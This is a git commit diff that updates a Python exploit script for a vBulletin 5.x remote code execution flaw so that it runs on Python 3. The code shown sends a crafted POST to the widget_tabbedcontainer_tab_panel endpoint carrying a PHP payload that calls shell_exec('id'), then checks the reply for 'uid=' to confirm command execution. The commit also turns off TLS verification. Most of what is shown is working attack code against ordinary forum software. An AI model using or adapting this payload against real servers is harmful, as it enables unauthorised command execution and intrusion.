831520e201ee84fe2b9008c13b01c48ad9148d49
ludy-dev <70466565+ludy-dev@users.noreply.github.com>
2020-11-07 19:11:55 +0900

    Update vBulletin_5.x-tab_panel-RCE.py
    editted code for supporting python3

--- vBulletin_5.x-tab_panel-RCE.py
+++ vBulletin_5.x-tab_panel-RCE.py
@@ -6,7 +6,7 @@ import os
 def exploit(dst_addr):
        URL="http://"+dst_addr+"/ajax/render/widget_tabbedcontainer_tab_panel"
        data ="subWidgets[0][template]=widget_php&subWidgets[0][config][code]=echo shell_exec(\"id\"); exit;"
-       res = requests.post(URL, data=data)
+       res = requests.post(URL, data=data, verify=False)
        response = res.text
 
        p = re.compile('uid=\d')
@@ -21,7 +21,7 @@ if __name__ == "__main__":
        if len(sys.argv) == 2:
               sys.argv.append('80')
        elif len(sys.argv) < 3:
-               print 'Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0])
+               print ('Usage: python %s <dst_ip> <dst_port>' % os.path.basename(sys.argv[0]))
                sys.exit()
                
        address =(sys.argv[1], sys.argv[2])
